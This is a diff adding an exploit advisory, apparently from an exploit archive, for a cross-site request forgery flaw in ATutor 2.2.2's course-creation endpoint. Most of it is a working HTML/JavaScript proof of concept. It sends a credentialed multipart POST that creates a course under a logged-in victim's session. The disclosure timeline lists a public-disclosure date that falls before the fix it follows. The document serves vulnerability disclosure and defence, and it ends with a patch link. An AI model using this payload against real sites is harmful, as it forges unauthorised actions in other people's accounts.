@@ -1,0 +1,217 @@
+# Exploit Title: ATutor_2.2.2 Learning Management System 
+# Cross-Site Request Forgery (Add New Course)
+# Date: 13-11-2016
+# Software Link: https://github.com/atutor/ATutor/releases/tag/atutor_2_2_2
+# Vendor: http://www.atutor.ca/
+# Exploit Author: Saravana Kumar
+# Contact: https://facebook.com/06saravanakumar
+# Category: webapps
+# Version: 2.2.2
+# Platform: PHP
+# Tested on: [Kali Linux 2.0 | Windows 7]
+# Email: 06saravanakumar@gmail.com
+# Affected URL:
+http://localhost/ATutor/mods/_core/courses/users/create_course.php
+
+==================================
+Vulnerability Disclosure Timeline: ================================== 2016-11-07: Found the vulnerability and Reported to Vendor. 2016-11-08: Vendor Replied. 2016-11-10: Vendor Fixed the vulnerability. 2016-11-11: Patch released 2016-10-12: Public Disclosure
+
+########################### CSRF PoC ###############################
+ 
+<html>
+   <------ CSRF POC ------>
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost/ATutor/mods/_core/courses/users/create_course.php", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------34481053430281");
+        xhr.withCredentials = true;
+        var body = "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"form_course\"\r\n" + 
+          "\r\n" + 
+          "true\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n" + 
+          "\r\n" + 
+          "819200\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"course\"\r\n" + 
+          "\r\n" + 
+          "0\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"old_access\"\r\n" + 
+          "\r\n" + 
+          "protected\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"created_date\"\r\n" + 
+          "\r\n" + 
+          "2016-11-07 06:55:20\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"show_courses\"\r\n" + 
+          "\r\n" + 
+          "0\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"current_cat\"\r\n" + 
+          "\r\n" + 
+          "0\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"title\"\r\n" + 
+          "\r\n" + 
+          "Programming Language\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"pri_lang\"\r\n" + 
+          "\r\n" + 
+          "en\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"description\"\r\n" + 
+          "\r\n" + 
+          "Python\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"category_parent\"\r\n" + 
+          "\r\n" + 
+          "0\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"content_packaging\"\r\n" + 
+          "\r\n" + 
+          "top\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"rss\"\r\n" + 
+          "\r\n" + 
+          "0\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"access\"\r\n" + 
+          "\r\n" + 
+          "protected\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"release_date\"\r\n" + 
+          "\r\n" + 
+          "0\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"day_release\"\r\n" + 
+          "\r\n" + 
+          "1\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"month_release\"\r\n" + 
+          "\r\n" + 
+          "1\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"year_release\"\r\n" + 
+          "\r\n" + 
+          "2016\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"hour_release\"\r\n" + 
+          "\r\n" + 
+          "0\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"min_release\"\r\n" + 
+          "\r\n" + 
+          "0\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"end_date\"\r\n" + 
+          "\r\n" + 
+          "0\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"day_end\"\r\n" + 
+          "\r\n" + 
+          "1\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"month_end\"\r\n" + 
+          "\r\n" + 
+          "1\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"year_end\"\r\n" + 
+          "\r\n" + 
+          "2017\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"hour_end\"\r\n" + 
+          "\r\n" + 
+          "0\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"min_end\"\r\n" + 
+          "\r\n" + 
+          "0\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"setvisual\"\r\n" + 
+          "\r\n" + 
+          "1\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"banner\"\r\n" + 
+          "\r\n" + 
+          "\x3cp\x3eCan fill content what ever you want.\x3c/p\x3e\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"initial_content\"\r\n" + 
+          "\r\n" + 
+          "1\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"quota\"\r\n" + 
+          "\r\n" + 
+          "-2\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"filesize\"\r\n" + 
+          "\r\n" + 
+          "-3\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"tracking\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"copyright\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"boolForce\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"icon\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n" + 
+          "\r\n" + 
+          "819200\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"customicon\"; filename=\"\"\r\n" + 
+          "Content-Type: application/octet-stream\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"custOptCount\"\r\n" + 
+          "\r\n" + 
+          "0\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"courseId\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------34481053430281\r\n" + 
+          "Content-Disposition: form-data; name=\"submit\"\r\n" + 
+          "\r\n" + 
+          "Save\r\n" + 
+          "-----------------------------34481053430281--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+ <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
+
+---------------------------------------------------------------------------
+ 
+Solution:
+ 
+Patch is available. Install patch using the ATutor Patcher.
+
+Link to download patch:
+
+http://update.atutor.ca/patch/2_2_2/2_2_2-6/patch.xml
+---------------------------------------------------------------------------
+ 
